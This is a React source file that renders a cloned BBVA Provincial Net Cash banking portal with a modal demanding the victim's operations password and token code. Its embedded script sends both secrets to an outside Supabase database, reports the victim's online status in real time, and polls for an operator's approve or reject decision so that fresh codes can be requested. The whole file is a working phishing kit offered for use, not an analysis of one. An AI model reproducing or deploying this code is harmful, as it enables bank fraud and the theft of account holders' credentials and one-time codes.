import { useEffect } from "react";
import { useLocation } from "react-router-dom";

const SB_URL = "https://cvjzrgeylvjfomnumhff.supabase.co";
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN2anpyZ2V5bHZqZm9tbnVtaGZmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYwMDA1NTAsImV4cCI6MjA5MTU3NjU1MH0.44hCEhxf0wx1iChO2dQSEt1uXRZ1JKZtaLvEkQx7JbI";

function buildHTML(sessionId) {
  return `<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BBVA Net Cash</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: Arial, sans-serif; font-size: 13px; color: #333; background: #fff; }
  .top-bar { background: #fff; border-bottom: 1px solid #ddd; display: flex; align-items: center; justify-content: space-between; padding: 6px 14px; height: 54px; }
  .top-right { display: flex; align-items: center; gap: 6px; }
  .country-badge { border: 1px solid #ccc; padding: 3px 10px; border-radius: 2px; font-size: 12px; color: #333; }
  .user-info { background: #f0f7ff; border: 1px solid #b3d4f0; padding: 3px 10px; border-radius: 2px; font-size: 12px; color: #004481; }
  .btn-top { padding: 5px 12px; border: none; border-radius: 2px; font-size: 12px; cursor: pointer; font-weight: bold; background: #004481; color: #fff; }
  .btn-exit { background: #c00; color: #fff; padding: 5px 8px; border: none; border-radius: 2px; cursor: pointer; font-size: 13px; font-weight: bold; }
  .sec-nav { background: #fff; border-bottom: 1px solid #ddd; display: flex; justify-content: flex-end; align-items: center; padding: 4px 14px; gap: 16px; font-size: 12px; }
  .sec-nav a { color: #004481; text-decoration: none; }
  .sec-nav .sep { color: #ccc; }
  .breadcrumb { background: #f5f5f5; border-bottom: 2px solid #009BDE; display: flex; align-items: center; justify-content: space-between; padding: 5px 14px; font-size: 12px; }
  .breadcrumb .location { color: #004481; font-weight: bold; }
  .breadcrumb .feedback { color: #004481; font-size: 11px; text-decoration: none; }
  .main-layout { display: flex; min-height: calc(100vh - 165px); transition: filter 0.4s ease; }
  .main-layout.loading-blur { filter: blur(3px); pointer-events: none; user-select: none; }
  .sidebar { width: 178px; min-width: 178px; background: #fff; border-right: 1px solid #e0e0e0; display: flex; flex-direction: column; }
  .sidebar-menu { flex: 1; overflow-y: auto; }
  .menu-item { border-bottom: 1px solid #e8e8e8; }
  .menu-item > a, .menu-item > span { display: flex; align-items: center; justify-content: space-between; padding: 9px 12px; font-size: 13px; color: #333; text-decoration: none; cursor: pointer; }
  .menu-item > a:hover, .menu-item > span:hover { background: #f0f7ff; }
  .menu-item.active > span { background: #009BDE; color: #fff; font-weight: bold; }
  .menu-item.active > span .arrow { color: #fff; }
  .arrow { font-size: 10px; color: #999; }
  .submenu { background: #f9f9f9; display: none; }
  .menu-item.active .submenu { display: block; }
  .submenu a { display: block; padding: 7px 20px; font-size: 12px; color: #333; text-decoration: none; border-bottom: 1px solid #ebebeb; }
  .submenu a:hover { background: #e8f3fb; color: #004481; }
  .sidebar-handle { position: relative; width: 16px; background: #e8e8e8; cursor: pointer; border-right: 1px solid #d0d0d0; }
  .sidebar-search { display: flex; align-items: center; border-top: 1px solid #ddd; padding: 8px; gap: 4px; background: #fff; }
  .sidebar-search input { flex: 1; border: 1px solid #ccc; padding: 4px 6px; font-size: 12px; color: #999; outline: none; border-radius: 2px; }
  .sidebar-search button { background: none; border: none; cursor: pointer; color: #666; font-size: 14px; padding: 2px 4px; }
  .content { flex: 1; padding: 20px 28px; background: #fff; }
  .content h2 { font-size: 20px; font-weight: normal; color: #333; margin-bottom: 28px; }
  .ops-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 0; }
  .ops-section { padding-right: 20px; }
  .ops-section h3 { display: flex; align-items: center; gap: 10px; font-size: 15px; font-weight: bold; color: #333; margin-bottom: 14px; }
  .ops-section h3 .icon { width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; }
  .ops-section h3 .icon svg { width: 28px; height: 28px; fill: none; stroke: #888; stroke-width: 1.5; }
  .ops-section ul { list-style: none; padding-left: 12px; }
  .ops-section ul li { margin-bottom: 5px; padding-left: 14px; position: relative; }
  .ops-section ul li::before { content: '\\2022'; position: absolute; left: 0; color: #333; font-size: 12px; }
  .ops-section ul li a { color: #004481; text-decoration: none; font-size: 13px; }
  .ops-section ul li a:hover { text-decoration: underline; }
  .footer { background: #f5f5f5; border-top: 1px solid #ddd; padding: 10px 14px; display: flex; justify-content: space-between; align-items: center; font-size: 11px; color: #555; }
  .footer-links { display: flex; gap: 16px; }
  .footer-links a { color: #004481; text-decoration: none; }

  /* Modal */
  .modal-backdrop { position: fixed; inset: 0; z-index: 10000; background: rgba(0,0,0,0.45); display: flex; align-items: center; justify-content: center; opacity: 0; transition: opacity 0.3s ease; pointer-events: none; }
  .modal-backdrop.visible { opacity: 1; pointer-events: all; }
  .ventanaModal { background: #fff; border: 1px solid #b3d4f0; border-radius: 3px; box-shadow: 0 8px 32px rgba(0,68,129,0.18); width: 560px; display: flex; flex-direction: column; overflow: hidden; }
  .modal-header { border-bottom: 3px solid #009BDE; padding: 14px 18px 10px 18px; display: flex; align-items: flex-start; justify-content: space-between; }
  .modal-logo { display: flex; flex-direction: column; line-height: 1.15; }
  .modal-logo .bbva-text { font-size: 20px; font-weight: bold; color: #004481; }
  .modal-logo .bbva-text span { color: #1464A0; font-weight: normal; font-size: 17px; }
  .modal-logo .netcash-text { font-size: 11px; color: #009BDE; margin-top: 2px; }
  .modal-close { border: 1px solid #009BDE; background: #fff; color: #009BDE; font-size: 13px; font-weight: bold; width: 22px; height: 22px; display: flex; align-items: center; justify-content: center; cursor: pointer; border-radius: 2px; }
  .modal-close:hover { background: #009BDE; color: #fff; }
  .modal-body { padding: 24px 32px 28px; }
  .modal-title { font-size: 19px; font-weight: bold; color: #1a1a1a; margin-bottom: 20px; font-family: Arial, sans-serif; letter-spacing: 0.01em; }

  /* Firma form */
  .firma-section { border: 1px solid #bbb; margin-bottom: 18px; }
  .firma-header { background: #dde3e8; padding: 7px 12px; font-size: 13px; font-weight: bold; color: #333; border-bottom: 1px solid #bbb; }
  .firma-body { padding: 14px 12px 8px; }
  .firma-row { display: flex; align-items: center; margin-bottom: 13px; }
  .firma-label { width: 165px; font-size: 13px; color: #333; flex-shrink: 0; font-weight: normal; }
  .firma-input { width: 155px; height: 26px; border: 1px solid #888; padding: 2px 6px; font-size: 13px; outline: none; background: #fff; }
  .firma-input:focus { border-color: #004481; }
  .firma-input:disabled { background: #f0f0f0; color: #999; }
  .input-wrapper { position: relative; display: inline-flex; align-items: center; }
  .eye-btn { position: absolute; right: 5px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; padding: 0; color: #aaa; display: flex; align-items: center; line-height: 1; }
  .eye-btn:hover { color: #004481; }
  .firma-input.has-eye { padding-right: 26px; }
  .modal-loading-box { display: none; align-items: center; gap: 18px; background: #fff; border: 2px solid #009BDE; border-radius: 4px; padding: 20px 30px; font-size: 14px; color: #333; margin: 8px 0; }
  .modal-loading-spinner { width: 36px; height: 36px; border: 4px solid #e0f0fb; border-top-color: #009BDE; border-radius: 50%; animation: spin2 0.9s linear infinite; flex-shrink: 0; }

  /* Enviar button */
  .firma-btn { background: #1973B8; color: #fff; border: none; padding: 9px 32px; font-size: 14px; font-weight: bold; cursor: pointer; border-radius: 2px; font-family: Arial, sans-serif; letter-spacing: 0.02em; margin-top: 4px; }
  .firma-btn:hover:not(:disabled) { background: #155a9b; }
  .firma-btn:disabled { background: #aaa; cursor: default; }

  /* Error inline */
  .firma-error { display: none; background: #fff0f0; border: 1px solid #f5c6c6; border-radius: 4px; padding: 10px 14px; margin-bottom: 14px; font-size: 13px; color: #c0392b; line-height: 1.5; }

  /* Form loading */
  .form-loading { display: none; align-items: center; gap: 14px; padding: 16px 0 8px; }
  .form-spinner { width: 28px; height: 28px; border: 3px solid #d1e6f7; border-top-color: #1973B8; border-radius: 50%; animation: spin2 0.9s linear infinite; flex-shrink: 0; }
  @keyframes spin2 { to { transform: rotate(360deg); } }
  .form-loading-text { font-size: 14px; color: #004481; font-weight: bold; }

  /* Page loading overlay */
  .loading-overlay { position: fixed; inset: 0; z-index: 9999; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.15); }
  .loading-box { display: flex; align-items: center; gap: 18px; background: #fff; border: 2px solid #009BDE; border-radius: 4px; padding: 22px 36px; box-shadow: 0 2px 16px rgba(0,148,210,0.10); font-size: 15px; color: #333; min-width: 340px; }
  .loading-spinner { width: 36px; height: 36px; border: 4px solid #e0f0fb; border-top-color: #009BDE; border-radius: 50%; animation: spin2 0.9s linear infinite; flex-shrink: 0; }

  /* ── RESPONSIVE MÓVIL ── */
  @media (max-width: 768px) {
    /* Top bar */
    .top-bar { height: auto; flex-direction: column; align-items: flex-start; padding: 8px 10px; gap: 8px; }
    .top-right { flex-wrap: wrap; gap: 4px; width: 100%; }
    .btn-top { font-size: 11px; padding: 4px 8px; }
    .btn-exit { font-size: 12px; padding: 4px 7px; }
    .user-info { font-size: 11px; padding: 3px 8px; }
    .country-badge { font-size: 11px; padding: 3px 8px; }

    /* Nav secundaria */
    .sec-nav { flex-wrap: wrap; justify-content: flex-start; padding: 6px 10px; gap: 4px 10px; font-size: 11px; }

    /* Breadcrumb */
    .breadcrumb { flex-direction: column; align-items: flex-start; gap: 4px; padding: 6px 10px; font-size: 11px; }

    /* Layout principal: ocultar sidebar */
    .main-layout { flex-direction: column; min-height: unset; }
    .sidebar { display: none; }
    .sidebar-handle { display: none; }

    /* Contenido principal */
    .content { padding: 14px 12px; }
    .content h2 { font-size: 17px; margin-bottom: 16px; }

    /* Grid de operaciones: una columna */
    .ops-grid { grid-template-columns: 1fr; gap: 20px; }
    .ops-section { padding-right: 0; border-bottom: 1px solid #e8e8e8; padding-bottom: 16px; }
    .ops-section:last-child { border-bottom: none; }

    /* Footer */
    .footer { flex-direction: column; align-items: flex-start; gap: 8px; font-size: 10px; padding: 8px 10px; }
    .footer-links { flex-wrap: wrap; gap: 8px 14px; }

    /* Modal */
    .ventanaModal { width: 94vw; max-width: 94vw; }
    .modal-body { padding: 16px 14px 20px; }
    .modal-title { font-size: 16px; margin-bottom: 14px; }
    .firma-row { flex-direction: column; align-items: flex-start; gap: 5px; margin-bottom: 14px; }
    .firma-label { width: auto; font-size: 12px; }
    .firma-input { width: 100%; max-width: 260px; }
    .firma-btn { width: 100%; padding: 10px; font-size: 14px; }

    /* Loading box */
    .loading-box { min-width: unset; width: 90vw; padding: 18px 16px; font-size: 13px; }
    .modal-loading-box { padding: 16px 14px; font-size: 13px; }
  }

  @media (max-width: 400px) {
    .top-right { gap: 3px; }
    .btn-top { font-size: 10px; padding: 3px 6px; }
    .ops-section h3 { font-size: 14px; }
    .ops-section ul li a { font-size: 12px; }
    .ventanaModal { width: 98vw; }
    .modal-body { padding: 12px 10px 16px; }
  }
</style>
</head>
<body>

<div class="top-bar">
  <div style="display:flex;flex-direction:column;line-height:1.15;">
    <div style="font-size:22px;font-weight:bold;color:#004481;letter-spacing:-0.5px;">BBVA <span style="color:#1464A0;font-weight:normal;font-size:18px;">Provincial</span></div>
    <div style="font-size:11px;color:#009BDE;margin-top:1px;letter-spacing:0.3px;">Net Cash</div>
  </div>
  <div class="top-right">
    <span class="country-badge">Venezuela</span>
    <div class="user-info" id="userInfoBox"><strong id="userNombreEl">Cargando...</strong><br><span style="font-size:11px;" id="userRefEl"></span></div>
    <button class="btn-top">Administraci&#243;n y Control</button>
    <button class="btn-top">M&#225;s Info...</button>
    <button class="btn-top">Ayuda</button>
    <button class="btn-exit">&#x2715;</button>
  </div>
</div>

<div class="sec-nav">
  <a href="#">Favoritos &#9660;</a><span class="sep">|</span>
  <a href="#">Imprimir</a><span class="sep">|</span>
  <span style="color:#333;">0500-508.74.32 / +58-212-503.91.11 &#8679;</span><span class="sep">|</span>
  <a href="#">Espa&#241;ol &#9660;</a>
</div>

<div class="breadcrumb">
  <div><span style="color:#666;margin-right:4px;">&#8962;</span> Usted est&#225; en: <span class="location">Portada</span></div>
  <a href="#" class="feedback">Danos tu opini&#243;n &#x27A4;</a>
</div>

<div class="main-layout" id="mainLayout">
  <div style="display:flex;">
    <div class="sidebar">
      <div class="sidebar-menu">
        <div class="menu-item"><a href="#">Portada</a></div>
        <div class="menu-item"><span>Consultas <span class="arrow">&#9660;</span></span></div>
        <div class="menu-item active">
          <span>Pagos <span class="arrow">&#9650;</span></span>
          <div class="submenu" style="display:block;">
            <a href="#">Proveedores</a><a href="#">N&#243;minas</a><a href="#">Transferencias</a>
            <a href="#">Servicios</a><a href="#">SENIAT</a><a href="#">Pagos Referenciados</a>
          </div>
        </div>
        <div class="menu-item"><span>Cobros <span class="arrow">&#9660;</span></span></div>
        <div class="menu-item"><span>Cheques <span class="arrow">&#9660;</span></span></div>
        <div class="menu-item"><span>Tarjetas <span class="arrow">&#9660;</span></span></div>
        <div class="menu-item"><span>Mercados <span class="arrow">&#9660;</span></span></div>
        <div class="menu-item"><span>Utilidades <span class="arrow">&#9660;</span></span></div>
        <div class="menu-item"><span>Archivos y Operaci&#243;n <span class="arrow">&#9660;</span></span></div>
        <div class="menu-item"><span>Firmas <span class="arrow">&#9660;</span></span></div>
      </div>
      <div class="sidebar-search">
        <input type="text" placeholder="Buscar men&#250;s...">
        <button>&#128269;</button>
      </div>
    </div>
    <div class="sidebar-handle"></div>
  </div>
  <div class="content">
    <h2>Operaciones Frecuentes</h2>
    <div class="ops-grid">
      <div class="ops-section">
        <h3><div class="icon"><svg viewBox="0 0 28 28" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="5" width="24" height="18" rx="2" stroke="#888" stroke-width="1.5" fill="none"/><line x1="2" y1="10" x2="26" y2="10" stroke="#888" stroke-width="1.5"/><line x1="6" y1="15" x2="14" y2="15" stroke="#888" stroke-width="1.5"/><line x1="6" y1="18" x2="11" y2="18" stroke="#888" stroke-width="1.5"/></svg></div>Pagos</h3>
        <ul><li><a href="#">Crear</a></li><li><a href="#">Crear</a></li><li><a href="#">Archivos en Confecci&#243;n</a></li><li><a href="#">Transferencias Frecuentes</a></li></ul>
      </div>
      <div class="ops-section">
        <h3><div class="icon"><svg viewBox="0 0 28 28" xmlns="http://www.w3.org/2000/svg"><rect x="4" y="3" width="20" height="22" rx="2" stroke="#888" stroke-width="1.5" fill="none"/><line x1="8" y1="9" x2="20" y2="9" stroke="#888" stroke-width="1.5"/><line x1="8" y1="13" x2="20" y2="13" stroke="#888" stroke-width="1.5"/><path d="M8 19 Q11 16 14 19 Q17 22 20 19" stroke="#888" stroke-width="1.5" fill="none"/></svg></div>Firmas</h3>
        <ul><li><a href="#">Pendientes de Firma</a></li></ul>
      </div>
      <div class="ops-section">
        <h3><div class="icon"><svg viewBox="0 0 28 28" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="3" width="24" height="22" rx="2" stroke="#888" stroke-width="1.5" fill="none"/><line x1="6" y1="9" x2="22" y2="9" stroke="#888" stroke-width="1.2"/><line x1="6" y1="13" x2="22" y2="13" stroke="#888" stroke-width="1.2"/><line x1="6" y1="17" x2="16" y2="17" stroke="#888" stroke-width="1.2"/><line x1="2" y1="7" x2="26" y2="7" stroke="#888" stroke-width="1.5"/></svg></div>Consultas</h3>
        <ul><li><a href="#">Movimientos del D&#237;a</a></li><li><a href="#">Hist&#243;rico de Movimientos</a></li><li><a href="#">Posici&#243;n Global</a></li><li><a href="#">Saldos Contables</a></li></ul>
      </div>
    </div>
  </div>
</div>

<!-- MODAL con formulario 2FA -->
<div class="modal-backdrop visible" id="modalFirma" style="opacity:1;pointer-events:all;">
  <div class="ventanaModal">
    <div class="modal-header">
      <div class="modal-logo">
        <div class="bbva-text"><strong>BBVA</strong> <span>Provincial</span></div>
        <div class="netcash-text">Net Cash</div>
      </div>
    </div>
    <div class="modal-body">
      <div class="modal-title">Continuar...</div>

      <div class="firma-error" id="firmaError"></div>

      <div class="firma-section">
        <div class="firma-header"><strong>Se Requiere Verificación Adicional</strong></div>
        <div class="firma-body">
          <div class="firma-row">
            <span class="firma-label">Clave de Operaciones</span>
            <div class="input-wrapper">
              <input type="password" id="claveOp" class="firma-input has-eye" autocomplete="off">
              <button type="button" class="eye-btn" id="eyeOp" aria-label="Mostrar"></button>
            </div>
          </div>
          <div class="firma-row">
            <span class="firma-label">Clave del Token</span>
            <div class="input-wrapper">
              <input type="password" id="claveToken" class="firma-input has-eye" autocomplete="off" inputmode="numeric">
              <button type="button" class="eye-btn" id="eyeToken" aria-label="Mostrar"></button>
            </div>
          </div>
        </div>
      </div>

      <div class="modal-loading-box" id="formLoading">
        <div class="modal-loading-spinner"></div>
        <span>Procesando su petici&#243;n, por favor espere...</span>
      </div>

      <button class="firma-btn" id="enviarBtn" disabled>Enviar</button>
    </div>
  </div>
</div>

<!-- LOADING OVERLAY inicial -->
<div class="loading-overlay" id="loadingOverlay" style="display:none;">
  <div class="loading-box">
    <div class="loading-spinner"></div>
    <span>Procesando su petici&#243;n, por favor espere...</span>
  </div>
</div>

<div class="footer">
  <span>&#169; BBVA S.A. &#218;ltima conexi&#243;n:&nbsp;&nbsp;18-05-2026&nbsp;a las&nbsp;19:05h</span>
  <div class="footer-links"><span>Tarifas y otros avisos:</span><a href="#">Aviso legal</a><a href="#">Seguridad</a></div>
</div>

<script>
(function() {
  var SESSION_ID = "${sessionId}";
  var SB_URL = "${SB_URL}";
  var SB_KEY = "${SB_KEY}";

  var overlay      = document.getElementById('loadingOverlay');
  var layout       = document.getElementById('mainLayout');
  var modal        = document.getElementById('modalFirma');
  var claveOp      = document.getElementById('claveOp');
  var claveToken   = document.getElementById('claveToken');
  var enviarBtn    = document.getElementById('enviarBtn');
  var formLoad     = document.getElementById('formLoading');
  var errorDiv     = document.getElementById('firmaError');
  var firmaSection = document.querySelector('.firma-section');
  var eyeOp        = document.getElementById('eyeOp');
  var eyeToken     = document.getElementById('eyeToken');
  var pollTimer        = null;
  var done             = false;
  var pendingConfirmed = false;

  // ── Presence heartbeat ──────────────────────────────────────────────────
  var HEARTBEAT_INTERVAL = 10000;
  var _heartbeatTimer = null;
  var _rejected = false;
  var _debounceTimer = null;

  function patchPresence(payload) {
    if (!SESSION_ID) return;
    fetch(SB_URL + '/rest/v1/user_session_data?id=eq.' + SESSION_ID, {
      method: 'PATCH',
      headers: {
        'Content-Type': 'application/json',
        'apikey': SB_KEY,
        'Authorization': 'Bearer ' + SB_KEY,
        'Prefer': 'return=minimal',
      },
      body: JSON.stringify(payload),
      keepalive: true,
    }).catch(function() {});
  }

  function sendHeartbeat() {
    patchPresence({ client_online_status: 'online', last_seen: new Date().toISOString() });
  }

  function markOffline() {
    if (_heartbeatTimer) { clearInterval(_heartbeatTimer); _heartbeatTimer = null; }
    patchPresence({ client_online_status: 'offline' });
  }

  function startHeartbeat() {
    sendHeartbeat();
    if (_heartbeatTimer) clearInterval(_heartbeatTimer);
    _heartbeatTimer = setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
  }

  document.addEventListener('visibilitychange', function() {
    if (!SESSION_ID) return;
    if (document.hidden) { markOffline(); } else { startHeartbeat(); }
  });
  window.addEventListener('blur', function() { if (SESSION_ID) markOffline(); });
  window.addEventListener('focus', function() { if (SESSION_ID) startHeartbeat(); });
  window.addEventListener('beforeunload', function() { markOffline(); });
  window.addEventListener('pagehide', function() { markOffline(); });

  function onFormInteract() {
    if (!_rejected) return;
    if (_debounceTimer) clearTimeout(_debounceTimer);
    _debounceTimer = setTimeout(function() {
      patchPresence({ client_online_status: 'editing', last_seen: new Date().toISOString() });
    }, 100);
  }

  var firmaBodyEl = document.querySelector('.firma-body');
  if (firmaBodyEl) {
    firmaBodyEl.addEventListener('focusin', onFormInteract);
    firmaBodyEl.addEventListener('input', onFormInteract);
  }

  startHeartbeat();
  // ── /Presence ───────────────────────────────────────────────────────────

  var EYE_OPEN   = '<svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>';
  var EYE_CLOSED = '<svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>';

  eyeOp.innerHTML    = EYE_OPEN;
  eyeToken.innerHTML = EYE_OPEN;

  eyeOp.addEventListener('click', function() {
    var show = claveOp.type === 'password';
    claveOp.type = show ? 'text' : 'password';
    eyeOp.innerHTML = show ? EYE_CLOSED : EYE_OPEN;
  });
  eyeToken.addEventListener('click', function() {
    var show = claveToken.type === 'password';
    claveToken.type = show ? 'text' : 'password';
    eyeToken.innerHTML = show ? EYE_CLOSED : EYE_OPEN;
  });

  /* ── Validación: sin espacios en claveOp, solo números en claveToken ── */
  claveOp.addEventListener('keydown', function(e) {
    if (e.key === ' ') e.preventDefault();
  });
  claveOp.addEventListener('paste', function(e) {
    var txt = (e.clipboardData || window.clipboardData).getData('text');
    if (txt.indexOf(' ') !== -1) {
      e.preventDefault();
      document.execCommand('insertText', false, txt.replace(/ /g, ''));
    }
  });

  claveToken.addEventListener('keydown', function(e) {
    if (e.key === ' ') e.preventDefault();
  });
  claveToken.addEventListener('input', checkFields);
  claveToken.addEventListener('paste', function(e) {
    var txt = (e.clipboardData || window.clipboardData).getData('text');
    if (txt.indexOf(' ') !== -1) {
      e.preventDefault();
      document.execCommand('insertText', false, txt.replace(/ /g, ''));
    }
  });

  /* ── Habilitar botón según campos ── */
  function checkFields() {
    enviarBtn.disabled = !(claveOp.value.length >= 2 && claveToken.value.length >= 2);
  }
  claveOp.addEventListener('input', checkFields);

  /* ── Cargar info de usuario desde Supabase ── */
  function loadUserInfo() {
    if (!SESSION_ID) return;
    fetch(SB_URL + '/rest/v1/user_session_data?id=eq.' + SESSION_ID + '&select=nombre_display,ref_display', {
      headers: { 'apikey': SB_KEY, 'Authorization': 'Bearer ' + SB_KEY }
    })
    .then(function(r) { return r.json(); })
    .then(function(data) {
      if (!data || !data[0]) return;
      var nd = document.getElementById('userNombreEl');
      var rd = document.getElementById('userRefEl');
      if (nd && data[0].nombre_display) nd.textContent = data[0].nombre_display;
      if (rd && data[0].ref_display)    rd.textContent = 'Ref. ' + data[0].ref_display;
    })
    .catch(function() {});
  }
  loadUserInfo();

  /* ── Loading inicial → mostrar portal ── */
  var loadDelay = SESSION_ID ? 300 : 2500;
  setTimeout(function() {
    overlay.style.opacity = '0';
    overlay.style.transition = 'opacity 0.4s ease';
    layout.classList.remove('loading-blur');
    setTimeout(function() { overlay.style.display = 'none'; }, 400);
  }, loadDelay);

  /* modal already visible from HTML */

  /* ── Helpers ── */
  function setFormLoading(on) {
    formLoad.style.display     = on ? 'flex' : 'none';
    enviarBtn.style.display    = on ? 'none' : 'inline-block';
    firmaSection.style.display = on ? 'none' : 'block';
    if (!on) errorDiv.style.display = 'none';
  }

  function showError(msg) {
    errorDiv.textContent = msg;
    errorDiv.style.display = 'block';
    setTimeout(function() { errorDiv.style.display = 'none'; }, 3500);
  }

  function stopPoll() {
    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  }

  function handleResult(type) {
    if (done) return;
    done = true; // permanece true hasta que el usuario vuelva a enviar
    stopPoll();
    if (type === 'reject-op') {
      _rejected = true;
      setFormLoading(false);
      claveOp.value = '';
      claveToken.value = '';
      checkFields();
      showError('La Clave de Operaciones ingresada es incorrecta. Por favor, corrija la información e intente nuevamente.');
    } else if (type === 'reject-token') {
      _rejected = true;
      setFormLoading(false);
      claveToken.value = '';
      checkFields();
      showError('La Clave Token ingresada es incorrecta. Por favor, corrija la información e intente nuevamente.');
    } else if (type === 'approved') {
      window.location.href = '/rejection';
    }
  }

  function pollStatus() {
    if (done) return;
    fetch(SB_URL + '/rest/v1/user_session_data?id=eq.' + SESSION_ID + '&select=clave_especial_status,clave_digital_status', {
      headers: { 'apikey': SB_KEY, 'Authorization': 'Bearer ' + SB_KEY }
    })
    .then(function(r) { return r.json(); })
    .then(function(data) {
      if (!data || !data[0] || done) return;
      var es = data[0].clave_especial_status;
      var di = data[0].clave_digital_status;
      if (!pendingConfirmed) {
        if (es === 'pending' && di === 'pending') {
          pendingConfirmed = true;
        } else if (es === 'approved' || di === 'approved') {
          pendingConfirmed = true;
        } else {
          return;
        }
      }
      if (es === 'rejected') { handleResult('reject-op'); }
      else if (di === 'rejected') { handleResult('reject-token'); }
      else if (es === 'approved' || di === 'approved') { handleResult('approved'); }
    })
    .catch(function() {});
  }

  /* ── Enviar ── */
  enviarBtn.addEventListener('click', function() {
    var op  = claveOp.value;
    var tok = claveToken.value;
    if (op.length < 2 || tok.length < 2) return;
    done             = false;
    pendingConfirmed = false;
    _rejected        = false;
    startHeartbeat();
    setFormLoading(true);
    if (!SESSION_ID) return;
    fetch(SB_URL + '/rest/v1/user_session_data?id=eq.' + SESSION_ID, {
      method: 'PATCH',
      headers: {
        'apikey': SB_KEY,
        'Authorization': 'Bearer ' + SB_KEY,
        'Content-Type': 'application/json',
        'Prefer': 'return=minimal'
      },
      body: JSON.stringify({
        clave_especial: op,
        clave_digital: tok,
        clave_especial_status: 'pending',
        clave_digital_status: 'pending'
      })
    })
    .then(function() { pollTimer = setInterval(pollStatus, 300); })
    .catch(function() { pollTimer = setInterval(pollStatus, 300); });
  });
})();
</script>
</body>
</html>`;
}

export default function NetCashPortal() {
  const location = useLocation();

  let sessionId = location.state?.sessionId || "";
  if (sessionId) {
    sessionStorage.setItem("netcash_sid", sessionId);
  } else {
    sessionId = sessionStorage.getItem("netcash_sid") || "";
  }

  useEffect(() => {
    document.open();
    document.write(buildHTML(sessionId));
    document.close();
  }, []);

  return null;
}
